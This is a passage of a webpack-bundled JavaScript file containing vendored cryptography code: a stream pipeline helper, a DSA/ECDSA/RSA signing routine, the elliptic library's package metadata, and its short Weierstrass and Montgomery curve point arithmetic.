                        })(stream)
                            ? stream.abort()
                            : "function" == typeof stream.destroy
                            ? stream.destroy()
                            : void callback(err || new ERR_STREAM_DESTROYED("pipe"))
                    );
            };
        }
        function call(fn) {
            fn();
        }
        function pipe(from, to) {
            return from.pipe(to);
        }
        function popCallback(streams) {
            return streams.length ? ("function" != typeof streams[streams.length - 1] ? noop : streams.pop()) : noop;
        }
        module.exports = function () {
            for (var _len = arguments.length, streams = new Array(_len), _key = 0; _key < _len; _key++) streams[_key] = arguments[_key];
            var error,
                callback = popCallback(streams);
            if ((Array.isArray(streams[0]) && (streams = streams[0]), streams.length < 2)) throw new ERR_MISSING_ARGS("streams");
            var destroys = streams.map(function (stream, i) {
                var reading = i < streams.length - 1;
                return destroyer(stream, reading, i > 0, function (err) {
                    error || (error = err), err && destroys.forEach(call), reading || (destroys.forEach(call), callback(error));
                });
            });
            return streams.reduce(pipe);
        };
    },
    function (module, exports, __webpack_require__) {
        var Buffer = __webpack_require__(55).Buffer,
            createHmac = __webpack_require__(95),
            crt = __webpack_require__(57),
            EC = __webpack_require__(59).ec,
            BN = __webpack_require__(58),
            parseKeys = __webpack_require__(42),
            curves = __webpack_require__(130);
        function getKey(x, q, hash, algo) {
            if ((x = Buffer.from(x.toArray())).length < q.byteLength()) {
                var zeros = Buffer.alloc(q.byteLength() - x.length);
                x = Buffer.concat([zeros, x]);
            }
            var hlen = hash.length,
                hbits = (function (bits, q) {
                    bits = (bits = bits2int(bits, q)).mod(q);
                    var out = Buffer.from(bits.toArray());
                    if (out.length < q.byteLength()) {
                        var zeros = Buffer.alloc(q.byteLength() - out.length);
                        out = Buffer.concat([zeros, out]);
                    }
                    return out;
                })(hash, q),
                v = Buffer.alloc(hlen);
            v.fill(1);
            var k = Buffer.alloc(hlen);
            return (
                (k = createHmac(algo, k)
                    .update(v)
                    .update(Buffer.from([0]))
                    .update(x)
                    .update(hbits)
                    .digest()),
                (v = createHmac(algo, k).update(v).digest()),
                {
                    k: (k = createHmac(algo, k)
                        .update(v)
                        .update(Buffer.from([1]))
                        .update(x)
                        .update(hbits)
                        .digest()),
                    v: (v = createHmac(algo, k).update(v).digest()),
                }
            );
        }
        function bits2int(obits, q) {
            var bits = new BN(obits),
                shift = (obits.length << 3) - q.bitLength();
            return shift > 0 && bits.ishrn(shift), bits;
        }
        function makeKey(q, kv, algo) {
            var t, k;
            do {
                for (t = Buffer.alloc(0); 8 * t.length < q.bitLength(); ) (kv.v = createHmac(algo, kv.k).update(kv.v).digest()), (t = Buffer.concat([t, kv.v]));
                (k = bits2int(t, q)),
                    (kv.k = createHmac(algo, kv.k)
                        .update(kv.v)
                        .update(Buffer.from([0]))
                        .digest()),
                    (kv.v = createHmac(algo, kv.k).update(kv.v).digest());
            } while (-1 !== k.cmp(q));
            return k;
        }
        function makeR(g, k, p, q) {
            return g.toRed(BN.mont(p)).redPow(k).fromRed().mod(q);
        }
        (module.exports = function (hash, key, hashType, signType, tag) {
            var priv = parseKeys(key);
            if (priv.curve) {
                if ("ecdsa" !== signType && "ecdsa/rsa" !== signType) throw new Error("wrong private key type");
                return (function (hash, priv) {
                    var curveId = curves[priv.curve.join(".")];
                    if (!curveId) throw new Error("unknown curve " + priv.curve.join("."));
                    var out = new EC(curveId).keyFromPrivate(priv.privateKey).sign(hash);
                    return Buffer.from(out.toDER());
                })(hash, priv);
            }
            if ("dsa" === priv.type) {
                if ("dsa" !== signType) throw new Error("wrong private key type");
                return (function (hash, priv, algo) {
                    var k,
                        x = priv.params.priv_key,
                        p = priv.params.p,
                        q = priv.params.q,
                        g = priv.params.g,
                        r = new BN(0),
                        H = bits2int(hash, q).mod(q),
                        s = !1,
                        kv = getKey(x, q, hash, algo);
                    for (; !1 === s; )
                        (k = makeKey(q, kv, algo)),
                            (r = makeR(g, k, p, q)),
                            0 ===
                                (s = k
                                    .invm(q)
                                    .imul(H.add(x.mul(r)))
                                    .mod(q)).cmpn(0) && ((s = !1), (r = new BN(0)));
                    return (function (r, s) {
                        (r = r.toArray()), (s = s.toArray()), 128 & r[0] && (r = [0].concat(r));
                        128 & s[0] && (s = [0].concat(s));
                        var res = [48, r.length + s.length + 4, 2, r.length];
                        return (res = res.concat(r, [2, s.length], s)), Buffer.from(res);
                    })(r, s);
                })(hash, priv, hashType);
            }
            if ("rsa" !== signType && "ecdsa/rsa" !== signType) throw new Error("wrong private key type");
            hash = Buffer.concat([tag, hash]);
            for (var len = priv.modulus.byteLength(), pad = [0, 1]; hash.length + pad.length + 1 < len; ) pad.push(255);
            pad.push(0);
            for (var i = -1; ++i < hash.length; ) pad.push(hash[i]);
            return crt(pad, priv);
        }),
            (module.exports.getKey = getKey),
            (module.exports.makeKey = makeKey);
    },
    function (module, exports) {},
    function (module) {
        module.exports = JSON.parse(
            '{"name":"elliptic","version":"6.5.4","description":"EC cryptography","main":"lib/elliptic.js","files":["lib"],"scripts":{"lint":"eslint lib test","lint:fix":"npm run lint -- --fix","unit":"istanbul test _mocha --reporter=spec test/index.js","test":"npm run lint && npm run unit","version":"grunt dist && git add dist/"},"repository":{"type":"git","url":"git@github.com:indutny/elliptic"},"keywords":["EC","Elliptic","curve","Cryptography"],"author":"Fedor Indutny <fedor@indutny.com>","license":"MIT","bugs":{"url":"https://github.com/indutny/elliptic/issues"},"homepage":"https://github.com/indutny/elliptic","devDependencies":{"brfs":"^2.0.2","coveralls":"^3.1.0","eslint":"^7.6.0","grunt":"^1.2.1","grunt-browserify":"^5.3.0","grunt-cli":"^1.3.2","grunt-contrib-connect":"^3.0.0","grunt-contrib-copy":"^1.0.0","grunt-contrib-uglify":"^5.0.0","grunt-mocha-istanbul":"^5.0.2","grunt-saucelabs":"^9.0.1","istanbul":"^0.4.5","mocha":"^8.0.1"},"dependencies":{"bn.js":"^4.11.9","brorand":"^1.1.0","hash.js":"^1.0.0","hmac-drbg":"^1.0.1","inherits":"^2.0.4","minimalistic-assert":"^1.0.1","minimalistic-crypto-utils":"^1.0.1"}}'
        );
    },
    function (module, exports) {},
    function (module, exports, __webpack_require__) {
        "use strict";
        var utils = __webpack_require__(12),
            BN = __webpack_require__(15),
            inherits = __webpack_require__(3),
            Base = __webpack_require__(41),
            assert = utils.assert;
        function ShortCurve(conf) {
            Base.call(this, "short", conf),
                (this.a = new BN(conf.a, 16).toRed(this.red)),
                (this.b = new BN(conf.b, 16).toRed(this.red)),
                (this.tinv = this.two.redInvm()),
                (this.zeroA = 0 === this.a.fromRed().cmpn(0)),
                (this.threeA = 0 === this.a.fromRed().sub(this.p).cmpn(-3)),
                (this.endo = this._getEndomorphism(conf)),
                (this._endoWnafT1 = new Array(4)),
                (this._endoWnafT2 = new Array(4));
        }
        function Point(curve, x, y, isRed) {
            Base.BasePoint.call(this, curve, "affine"),
                null === x && null === y
                    ? ((this.x = null), (this.y = null), (this.inf = !0))
                    : ((this.x = new BN(x, 16)),
                      (this.y = new BN(y, 16)),
                      isRed && (this.x.forceRed(this.curve.red), this.y.forceRed(this.curve.red)),
                      this.x.red || (this.x = this.x.toRed(this.curve.red)),
                      this.y.red || (this.y = this.y.toRed(this.curve.red)),
                      (this.inf = !1));
        }
        function JPoint(curve, x, y, z) {
            Base.BasePoint.call(this, curve, "jacobian"),
                null === x && null === y && null === z ? ((this.x = this.curve.one), (this.y = this.curve.one), (this.z = new BN(0))) : ((this.x = new BN(x, 16)), (this.y = new BN(y, 16)), (this.z = new BN(z, 16))),
                this.x.red || (this.x = this.x.toRed(this.curve.red)),
                this.y.red || (this.y = this.y.toRed(this.curve.red)),
                this.z.red || (this.z = this.z.toRed(this.curve.red)),
                (this.zOne = this.z === this.curve.one);
        }
        inherits(ShortCurve, Base),
            (module.exports = ShortCurve),
            (ShortCurve.prototype._getEndomorphism = function (conf) {
                if (this.zeroA && this.g && this.n && 1 === this.p.modn(3)) {
                    var beta, lambda;
                    if (conf.beta) beta = new BN(conf.beta, 16).toRed(this.red);
                    else {
                        var betas = this._getEndoRoots(this.p);
                        beta = (beta = betas[0].cmp(betas[1]) < 0 ? betas[0] : betas[1]).toRed(this.red);
                    }
                    if (conf.lambda) lambda = new BN(conf.lambda, 16);
                    else {
                        var lambdas = this._getEndoRoots(this.n);
                        0 === this.g.mul(lambdas[0]).x.cmp(this.g.x.redMul(beta)) ? (lambda = lambdas[0]) : ((lambda = lambdas[1]), assert(0 === this.g.mul(lambda).x.cmp(this.g.x.redMul(beta))));
                    }
                    return {
                        beta: beta,
                        lambda: lambda,
                        basis: conf.basis
                            ? conf.basis.map(function (vec) {
                                  return { a: new BN(vec.a, 16), b: new BN(vec.b, 16) };
                              })
                            : this._getEndoBasis(lambda),
                    };
                }
            }),
            (ShortCurve.prototype._getEndoRoots = function (num) {
                var red = num === this.p ? this.red : BN.mont(num),
                    tinv = new BN(2).toRed(red).redInvm(),
                    ntinv = tinv.redNeg(),
                    s = new BN(3).toRed(red).redNeg().redSqrt().redMul(tinv);
                return [ntinv.redAdd(s).fromRed(), ntinv.redSub(s).fromRed()];
            }),
            (ShortCurve.prototype._getEndoBasis = function (lambda) {
                for (
                    var a0, b0, a1, b1, a2, b2, prevR, r, x, aprxSqrt = this.n.ushrn(Math.floor(this.n.bitLength() / 2)), u = lambda, v = this.n.clone(), x1 = new BN(1), y1 = new BN(0), x2 = new BN(0), y2 = new BN(1), i = 0;
                    0 !== u.cmpn(0);

                ) {
                    var q = v.div(u);
                    (r = v.sub(q.mul(u))), (x = x2.sub(q.mul(x1)));
                    var y = y2.sub(q.mul(y1));
                    if (!a1 && r.cmp(aprxSqrt) < 0) (a0 = prevR.neg()), (b0 = x1), (a1 = r.neg()), (b1 = x);
                    else if (a1 && 2 == ++i) break;
                    (prevR = r), (v = u), (u = r), (x2 = x1), (x1 = x), (y2 = y1), (y1 = y);
                }
                (a2 = r.neg()), (b2 = x);
                var len1 = a1.sqr().add(b1.sqr());
                return (
                    a2.sqr().add(b2.sqr()).cmp(len1) >= 0 && ((a2 = a0), (b2 = b0)),
                    a1.negative && ((a1 = a1.neg()), (b1 = b1.neg())),
                    a2.negative && ((a2 = a2.neg()), (b2 = b2.neg())),
                    [
                        { a: a1, b: b1 },
                        { a: a2, b: b2 },
                    ]
                );
            }),
            (ShortCurve.prototype._endoSplit = function (k) {
                var basis = this.endo.basis,
                    v1 = basis[0],
                    v2 = basis[1],
                    c1 = v2.b.mul(k).divRound(this.n),
                    c2 = v1.b.neg().mul(k).divRound(this.n),
                    p1 = c1.mul(v1.a),
                    p2 = c2.mul(v2.a),
                    q1 = c1.mul(v1.b),
                    q2 = c2.mul(v2.b);
                return { k1: k.sub(p1).sub(p2), k2: q1.add(q2).neg() };
            }),
            (ShortCurve.prototype.pointFromX = function (x, odd) {
                (x = new BN(x, 16)).red || (x = x.toRed(this.red));
                var y2 = x.redSqr().redMul(x).redIAdd(x.redMul(this.a)).redIAdd(this.b),
                    y = y2.redSqrt();
                if (0 !== y.redSqr().redSub(y2).cmp(this.zero)) throw new Error("invalid point");
                var isOdd = y.fromRed().isOdd();
                return ((odd && !isOdd) || (!odd && isOdd)) && (y = y.redNeg()), this.point(x, y);
            }),
            (ShortCurve.prototype.validate = function (point) {
                if (point.inf) return !0;
                var x = point.x,
                    y = point.y,
                    ax = this.a.redMul(x),
                    rhs = x.redSqr().redMul(x).redIAdd(ax).redIAdd(this.b);
                return 0 === y.redSqr().redISub(rhs).cmpn(0);
            }),
            (ShortCurve.prototype._endoWnafMulAdd = function (points, coeffs, jacobianResult) {
                for (var npoints = this._endoWnafT1, ncoeffs = this._endoWnafT2, i = 0; i < points.length; i++) {
                    var split = this._endoSplit(coeffs[i]),
                        p = points[i],
                        beta = p._getBeta();
                    split.k1.negative && (split.k1.ineg(), (p = p.neg(!0))),
                        split.k2.negative && (split.k2.ineg(), (beta = beta.neg(!0))),
                        (npoints[2 * i] = p),
                        (npoints[2 * i + 1] = beta),
                        (ncoeffs[2 * i] = split.k1),
                        (ncoeffs[2 * i + 1] = split.k2);
                }
                for (var res = this._wnafMulAdd(1, npoints, ncoeffs, 2 * i, jacobianResult), j = 0; j < 2 * i; j++) (npoints[j] = null), (ncoeffs[j] = null);
                return res;
            }),
            inherits(Point, Base.BasePoint),
            (ShortCurve.prototype.point = function (x, y, isRed) {
                return new Point(this, x, y, isRed);
            }),
            (ShortCurve.prototype.pointFromJSON = function (obj, red) {
                return Point.fromJSON(this, obj, red);
            }),
            (Point.prototype._getBeta = function () {
                if (this.curve.endo) {
                    var pre = this.precomputed;
                    if (pre && pre.beta) return pre.beta;
                    var beta = this.curve.point(this.x.redMul(this.curve.endo.beta), this.y);
                    if (pre) {
                        var curve = this.curve,
                            endoMul = function (p) {
                                return curve.point(p.x.redMul(curve.endo.beta), p.y);
                            };
                        (pre.beta = beta),
                            (beta.precomputed = { beta: null, naf: pre.naf && { wnd: pre.naf.wnd, points: pre.naf.points.map(endoMul) }, doubles: pre.doubles && { step: pre.doubles.step, points: pre.doubles.points.map(endoMul) } });
                    }
                    return beta;
                }
            }),
            (Point.prototype.toJSON = function () {
                return this.precomputed
                    ? [
                          this.x,
                          this.y,
                          this.precomputed && {
                              doubles: this.precomputed.doubles && { step: this.precomputed.doubles.step, points: this.precomputed.doubles.points.slice(1) },
                              naf: this.precomputed.naf && { wnd: this.precomputed.naf.wnd, points: this.precomputed.naf.points.slice(1) },
                          },
                      ]
                    : [this.x, this.y];
            }),
            (Point.fromJSON = function (curve, obj, red) {
                "string" == typeof obj && (obj = JSON.parse(obj));
                var res = curve.point(obj[0], obj[1], red);
                if (!obj[2]) return res;
                function obj2point(obj) {
                    return curve.point(obj[0], obj[1], red);
                }
                var pre = obj[2];
                return (
                    (res.precomputed = {
                        beta: null,
                        doubles: pre.doubles && { step: pre.doubles.step, points: [res].concat(pre.doubles.points.map(obj2point)) },
                        naf: pre.naf && { wnd: pre.naf.wnd, points: [res].concat(pre.naf.points.map(obj2point)) },
                    }),
                    res
                );
            }),
            (Point.prototype.inspect = function () {
                return this.isInfinity() ? "<EC Point Infinity>" : "<EC Point x: " + this.x.fromRed().toString(16, 2) + " y: " + this.y.fromRed().toString(16, 2) + ">";
            }),
            (Point.prototype.isInfinity = function () {
                return this.inf;
            }),
            (Point.prototype.add = function (p) {
                if (this.inf) return p;
                if (p.inf) return this;
                if (this.eq(p)) return this.dbl();
                if (this.neg().eq(p)) return this.curve.point(null, null);
                if (0 === this.x.cmp(p.x)) return this.curve.point(null, null);
                var c = this.y.redSub(p.y);
                0 !== c.cmpn(0) && (c = c.redMul(this.x.redSub(p.x).redInvm()));
                var nx = c.redSqr().redISub(this.x).redISub(p.x),
                    ny = c.redMul(this.x.redSub(nx)).redISub(this.y);
                return this.curve.point(nx, ny);
            }),
            (Point.prototype.dbl = function () {
                if (this.inf) return this;
                var ys1 = this.y.redAdd(this.y);
                if (0 === ys1.cmpn(0)) return this.curve.point(null, null);
                var a = this.curve.a,
                    x2 = this.x.redSqr(),
                    dyinv = ys1.redInvm(),
                    c = x2.redAdd(x2).redIAdd(x2).redIAdd(a).redMul(dyinv),
                    nx = c.redSqr().redISub(this.x.redAdd(this.x)),
                    ny = c.redMul(this.x.redSub(nx)).redISub(this.y);
                return this.curve.point(nx, ny);
            }),
            (Point.prototype.getX = function () {
                return this.x.fromRed();
            }),
            (Point.prototype.getY = function () {
                return this.y.fromRed();
            }),
            (Point.prototype.mul = function (k) {
                return (k = new BN(k, 16)), this.isInfinity() ? this : this._hasDoubles(k) ? this.curve._fixedNafMul(this, k) : this.curve.endo ? this.curve._endoWnafMulAdd([this], [k]) : this.curve._wnafMul(this, k);
            }),
            (Point.prototype.mulAdd = function (k1, p2, k2) {
                var points = [this, p2],
                    coeffs = [k1, k2];
                return this.curve.endo ? this.curve._endoWnafMulAdd(points, coeffs) : this.curve._wnafMulAdd(1, points, coeffs, 2);
            }),
            (Point.prototype.jmulAdd = function (k1, p2, k2) {
                var points = [this, p2],
                    coeffs = [k1, k2];
                return this.curve.endo ? this.curve._endoWnafMulAdd(points, coeffs, !0) : this.curve._wnafMulAdd(1, points, coeffs, 2, !0);
            }),
            (Point.prototype.eq = function (p) {
                return this === p || (this.inf === p.inf && (this.inf || (0 === this.x.cmp(p.x) && 0 === this.y.cmp(p.y))));
            }),
            (Point.prototype.neg = function (_precompute) {
                if (this.inf) return this;
                var res = this.curve.point(this.x, this.y.redNeg());
                if (_precompute && this.precomputed) {
                    var pre = this.precomputed,
                        negate = function (p) {
                            return p.neg();
                        };
                    res.precomputed = { naf: pre.naf && { wnd: pre.naf.wnd, points: pre.naf.points.map(negate) }, doubles: pre.doubles && { step: pre.doubles.step, points: pre.doubles.points.map(negate) } };
                }
                return res;
            }),
            (Point.prototype.toJ = function () {
                return this.inf ? this.curve.jpoint(null, null, null) : this.curve.jpoint(this.x, this.y, this.curve.one);
            }),
            inherits(JPoint, Base.BasePoint),
            (ShortCurve.prototype.jpoint = function (x, y, z) {
                return new JPoint(this, x, y, z);
            }),
            (JPoint.prototype.toP = function () {
                if (this.isInfinity()) return this.curve.point(null, null);
                var zinv = this.z.redInvm(),
                    zinv2 = zinv.redSqr(),
                    ax = this.x.redMul(zinv2),
                    ay = this.y.redMul(zinv2).redMul(zinv);
                return this.curve.point(ax, ay);
            }),
            (JPoint.prototype.neg = function () {
                return this.curve.jpoint(this.x, this.y.redNeg(), this.z);
            }),
            (JPoint.prototype.add = function (p) {
                if (this.isInfinity()) return p;
                if (p.isInfinity()) return this;
                var pz2 = p.z.redSqr(),
                    z2 = this.z.redSqr(),
                    u1 = this.x.redMul(pz2),
                    u2 = p.x.redMul(z2),
                    s1 = this.y.redMul(pz2.redMul(p.z)),
                    s2 = p.y.redMul(z2.redMul(this.z)),
                    h = u1.redSub(u2),
                    r = s1.redSub(s2);
                if (0 === h.cmpn(0)) return 0 !== r.cmpn(0) ? this.curve.jpoint(null, null, null) : this.dbl();
                var h2 = h.redSqr(),
                    h3 = h2.redMul(h),
                    v = u1.redMul(h2),
                    nx = r.redSqr().redIAdd(h3).redISub(v).redISub(v),
                    ny = r.redMul(v.redISub(nx)).redISub(s1.redMul(h3)),
                    nz = this.z.redMul(p.z).redMul(h);
                return this.curve.jpoint(nx, ny, nz);
            }),
            (JPoint.prototype.mixedAdd = function (p) {
                if (this.isInfinity()) return p.toJ();
                if (p.isInfinity()) return this;
                var z2 = this.z.redSqr(),
                    u1 = this.x,
                    u2 = p.x.redMul(z2),
                    s1 = this.y,
                    s2 = p.y.redMul(z2).redMul(this.z),
                    h = u1.redSub(u2),
                    r = s1.redSub(s2);
                if (0 === h.cmpn(0)) return 0 !== r.cmpn(0) ? this.curve.jpoint(null, null, null) : this.dbl();
                var h2 = h.redSqr(),
                    h3 = h2.redMul(h),
                    v = u1.redMul(h2),
                    nx = r.redSqr().redIAdd(h3).redISub(v).redISub(v),
                    ny = r.redMul(v.redISub(nx)).redISub(s1.redMul(h3)),
                    nz = this.z.redMul(h);
                return this.curve.jpoint(nx, ny, nz);
            }),
            (JPoint.prototype.dblp = function (pow) {
                if (0 === pow) return this;
                if (this.isInfinity()) return this;
                if (!pow) return this.dbl();
                var i;
                if (this.curve.zeroA || this.curve.threeA) {
                    var r = this;
                    for (i = 0; i < pow; i++) r = r.dbl();
                    return r;
                }
                var a = this.curve.a,
                    tinv = this.curve.tinv,
                    jx = this.x,
                    jy = this.y,
                    jz = this.z,
                    jz4 = jz.redSqr().redSqr(),
                    jyd = jy.redAdd(jy);
                for (i = 0; i < pow; i++) {
                    var jx2 = jx.redSqr(),
                        jyd2 = jyd.redSqr(),
                        jyd4 = jyd2.redSqr(),
                        c = jx2.redAdd(jx2).redIAdd(jx2).redIAdd(a.redMul(jz4)),
                        t1 = jx.redMul(jyd2),
                        nx = c.redSqr().redISub(t1.redAdd(t1)),
                        t2 = t1.redISub(nx),
                        dny = c.redMul(t2);
                    dny = dny.redIAdd(dny).redISub(jyd4);
                    var nz = jyd.redMul(jz);
                    i + 1 < pow && (jz4 = jz4.redMul(jyd4)), (jx = nx), (jz = nz), (jyd = dny);
                }
                return this.curve.jpoint(jx, jyd.redMul(tinv), jz);
            }),
            (JPoint.prototype.dbl = function () {
                return this.isInfinity() ? this : this.curve.zeroA ? this._zeroDbl() : this.curve.threeA ? this._threeDbl() : this._dbl();
            }),
            (JPoint.prototype._zeroDbl = function () {
                var nx, ny, nz;
                if (this.zOne) {
                    var xx = this.x.redSqr(),
                        yy = this.y.redSqr(),
                        yyyy = yy.redSqr(),
                        s = this.x.redAdd(yy).redSqr().redISub(xx).redISub(yyyy);
                    s = s.redIAdd(s);
                    var m = xx.redAdd(xx).redIAdd(xx),
                        t = m.redSqr().redISub(s).redISub(s),
                        yyyy8 = yyyy.redIAdd(yyyy);
                    (yyyy8 = (yyyy8 = yyyy8.redIAdd(yyyy8)).redIAdd(yyyy8)), (nx = t), (ny = m.redMul(s.redISub(t)).redISub(yyyy8)), (nz = this.y.redAdd(this.y));
                } else {
                    var a = this.x.redSqr(),
                        b = this.y.redSqr(),
                        c = b.redSqr(),
                        d = this.x.redAdd(b).redSqr().redISub(a).redISub(c);
                    d = d.redIAdd(d);
                    var e = a.redAdd(a).redIAdd(a),
                        f = e.redSqr(),
                        c8 = c.redIAdd(c);
                    (c8 = (c8 = c8.redIAdd(c8)).redIAdd(c8)), (nx = f.redISub(d).redISub(d)), (ny = e.redMul(d.redISub(nx)).redISub(c8)), (nz = (nz = this.y.redMul(this.z)).redIAdd(nz));
                }
                return this.curve.jpoint(nx, ny, nz);
            }),
            (JPoint.prototype._threeDbl = function () {
                var nx, ny, nz;
                if (this.zOne) {
                    var xx = this.x.redSqr(),
                        yy = this.y.redSqr(),
                        yyyy = yy.redSqr(),
                        s = this.x.redAdd(yy).redSqr().redISub(xx).redISub(yyyy);
                    s = s.redIAdd(s);
                    var m = xx.redAdd(xx).redIAdd(xx).redIAdd(this.curve.a),
                        t = m.redSqr().redISub(s).redISub(s);
                    nx = t;
                    var yyyy8 = yyyy.redIAdd(yyyy);
                    (yyyy8 = (yyyy8 = yyyy8.redIAdd(yyyy8)).redIAdd(yyyy8)), (ny = m.redMul(s.redISub(t)).redISub(yyyy8)), (nz = this.y.redAdd(this.y));
                } else {
                    var delta = this.z.redSqr(),
                        gamma = this.y.redSqr(),
                        beta = this.x.redMul(gamma),
                        alpha = this.x.redSub(delta).redMul(this.x.redAdd(delta));
                    alpha = alpha.redAdd(alpha).redIAdd(alpha);
                    var beta4 = beta.redIAdd(beta),
                        beta8 = (beta4 = beta4.redIAdd(beta4)).redAdd(beta4);
                    (nx = alpha.redSqr().redISub(beta8)), (nz = this.y.redAdd(this.z).redSqr().redISub(gamma).redISub(delta));
                    var ggamma8 = gamma.redSqr();
                    (ggamma8 = (ggamma8 = (ggamma8 = ggamma8.redIAdd(ggamma8)).redIAdd(ggamma8)).redIAdd(ggamma8)), (ny = alpha.redMul(beta4.redISub(nx)).redISub(ggamma8));
                }
                return this.curve.jpoint(nx, ny, nz);
            }),
            (JPoint.prototype._dbl = function () {
                var a = this.curve.a,
                    jx = this.x,
                    jy = this.y,
                    jz = this.z,
                    jz4 = jz.redSqr().redSqr(),
                    jx2 = jx.redSqr(),
                    jy2 = jy.redSqr(),
                    c = jx2.redAdd(jx2).redIAdd(jx2).redIAdd(a.redMul(jz4)),
                    jxd4 = jx.redAdd(jx),
                    t1 = (jxd4 = jxd4.redIAdd(jxd4)).redMul(jy2),
                    nx = c.redSqr().redISub(t1.redAdd(t1)),
                    t2 = t1.redISub(nx),
                    jyd8 = jy2.redSqr();
                jyd8 = (jyd8 = (jyd8 = jyd8.redIAdd(jyd8)).redIAdd(jyd8)).redIAdd(jyd8);
                var ny = c.redMul(t2).redISub(jyd8),
                    nz = jy.redAdd(jy).redMul(jz);
                return this.curve.jpoint(nx, ny, nz);
            }),
            (JPoint.prototype.trpl = function () {
                if (!this.curve.zeroA) return this.dbl().add(this);
                var xx = this.x.redSqr(),
                    yy = this.y.redSqr(),
                    zz = this.z.redSqr(),
                    yyyy = yy.redSqr(),
                    m = xx.redAdd(xx).redIAdd(xx),
                    mm = m.redSqr(),
                    e = this.x.redAdd(yy).redSqr().redISub(xx).redISub(yyyy),
                    ee = (e = (e = (e = e.redIAdd(e)).redAdd(e).redIAdd(e)).redISub(mm)).redSqr(),
                    t = yyyy.redIAdd(yyyy);
                t = (t = (t = t.redIAdd(t)).redIAdd(t)).redIAdd(t);
                var u = m.redIAdd(e).redSqr().redISub(mm).redISub(ee).redISub(t),
                    yyu4 = yy.redMul(u);
                yyu4 = (yyu4 = yyu4.redIAdd(yyu4)).redIAdd(yyu4);
                var nx = this.x.redMul(ee).redISub(yyu4);
                nx = (nx = nx.redIAdd(nx)).redIAdd(nx);
                var ny = this.y.redMul(u.redMul(t.redISub(u)).redISub(e.redMul(ee)));
                ny = (ny = (ny = ny.redIAdd(ny)).redIAdd(ny)).redIAdd(ny);
                var nz = this.z.redAdd(e).redSqr().redISub(zz).redISub(ee);
                return this.curve.jpoint(nx, ny, nz);
            }),
            (JPoint.prototype.mul = function (k, kbase) {
                return (k = new BN(k, kbase)), this.curve._wnafMul(this, k);
            }),
            (JPoint.prototype.eq = function (p) {
                if ("affine" === p.type) return this.eq(p.toJ());
                if (this === p) return !0;
                var z2 = this.z.redSqr(),
                    pz2 = p.z.redSqr();
                if (0 !== this.x.redMul(pz2).redISub(p.x.redMul(z2)).cmpn(0)) return !1;
                var z3 = z2.redMul(this.z),
                    pz3 = pz2.redMul(p.z);
                return 0 === this.y.redMul(pz3).redISub(p.y.redMul(z3)).cmpn(0);
            }),
            (JPoint.prototype.eqXToP = function (x) {
                var zs = this.z.redSqr(),
                    rx = x.toRed(this.curve.red).redMul(zs);
                if (0 === this.x.cmp(rx)) return !0;
                for (var xc = x.clone(), t = this.curve.redN.redMul(zs); ; ) {
                    if ((xc.iadd(this.curve.n), xc.cmp(this.curve.p) >= 0)) return !1;
                    if ((rx.redIAdd(t), 0 === this.x.cmp(rx))) return !0;
                }
            }),
            (JPoint.prototype.inspect = function () {
                return this.isInfinity() ? "<EC JPoint Infinity>" : "<EC JPoint x: " + this.x.toString(16, 2) + " y: " + this.y.toString(16, 2) + " z: " + this.z.toString(16, 2) + ">";
            }),
            (JPoint.prototype.isInfinity = function () {
                return 0 === this.z.cmpn(0);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var BN = __webpack_require__(15),
            inherits = __webpack_require__(3),
            Base = __webpack_require__(41),
            utils = __webpack_require__(12);
        function MontCurve(conf) {
            Base.call(this, "mont", conf),
                (this.a = new BN(conf.a, 16).toRed(this.red)),
                (this.b = new BN(conf.b, 16).toRed(this.red)),
                (this.i4 = new BN(4).toRed(this.red).redInvm()),
                (this.two = new BN(2).toRed(this.red)),
                (this.a24 = this.i4.redMul(this.a.redAdd(this.two)));
        }
        function Point(curve, x, z) {
            Base.BasePoint.call(this, curve, "projective"),
                null === x && null === z
                    ? ((this.x = this.curve.one), (this.z = this.curve.zero))
                    : ((this.x = new BN(x, 16)), (this.z = new BN(z, 16)), this.x.red || (this.x = this.x.toRed(this.curve.red)), this.z.red || (this.z = this.z.toRed(this.curve.red)));
        }
        inherits(MontCurve, Base),
            (module.exports = MontCurve),
            (MontCurve.prototype.validate = function (point) {
                var x = point.normalize().x,
                    x2 = x.redSqr(),
                    rhs = x2.redMul(x).redAdd(x2.redMul(this.a)).redAdd(x);
                return 0 === rhs.redSqrt().redSqr().cmp(rhs);
            }),
            inherits(Point, Base.BasePoint),
            (MontCurve.prototype.decodePoint = function (bytes, enc) {
                return this.point(utils.toArray(bytes, enc), 1);
            }),
            (MontCurve.prototype.point = function (x, z) {
                return new Point(this, x, z);
            }),
            (MontCurve.prototype.pointFromJSON = function (obj) {
                return Point.fromJSON(this, obj);
            }),
            (Point.prototype.precompute = function () {}),
            (Point.prototype._encode = function () {
                return this.getX().toArray("be", this.curve.p.byteLength());
            }),
            (Point.fromJSON = function (curve, obj) {
                return new Point(curve, obj[0], obj[1] || curve.one);
            }),
            (Point.prototype.inspect = function () {
                return this.isInfinity() ? "<EC Point Infinity>" : "<EC Point x: " + this.x.fromRed().toString(16, 2) + " z: " + this.z.fromRed().toString(16, 2) + ">";
            }),
            (Point.prototype.isInfinity = function () {
                return 0 === this.z.cmpn(0);
            }),
            (Point.prototype.dbl = function () {
                var aa = this.x.redAdd(this.z).redSqr(),
                    bb = this.x.redSub(this.z).redSqr(),
                    c = aa.redSub(bb),
                    nx = aa.redMul(bb),
                    nz = c.redMul(bb.redAdd(this.curve.a24.redMul(c)));
                return this.curve.point(nx, nz);
            }),
            (Point.prototype.add = function () {
                throw new Error("Not supported on Montgomery curve");
            }),
            (Point.prototype.diffAdd = function (p, diff) {
                var a = this.x.redAdd(this.z),
                    b = this.x.redSub(this.z),
                    c = p.x.redAdd(p.z),
                    da = p.x.redSub(p.z).redMul(a),
                    cb = c.redMul(b),
                    nx = diff.z.redMul(da.redAdd(cb).redSqr()),
                    nz = diff.x.redMul(da.redISub(cb).redSqr());
                return this.curve.point(nx, nz);
            }),
            (Point.prototype.mul = function (k) {
                for (var t = k.clone(), a = this, b = this.curve.point(null, null), bits = []; 0 !== t.cmpn(0); t.iushrn(1)) bits.push(t.andln(1));
                for (var i = bits.length - 1; i >= 0; i--) 0 === bits[i] ? ((a = a.diffAdd(b, this)), (b = b.dbl())) : ((b = a.diffAdd(b, this)), (a = a.dbl()));
                return b;
            }),
            (Point.prototype.mulAdd = function () {
                throw new Error("Not supported on Montgomery curve");
            }),
            (Point.prototype.jumlAdd = function () {
                throw new Error("Not supported on Montgomery curve");
            }),
            (Point.prototype.eq = function (other) {
                return 0 === this.getX().cmp(other.getX());
            }),
            (Point.prototype.normalize = function () {
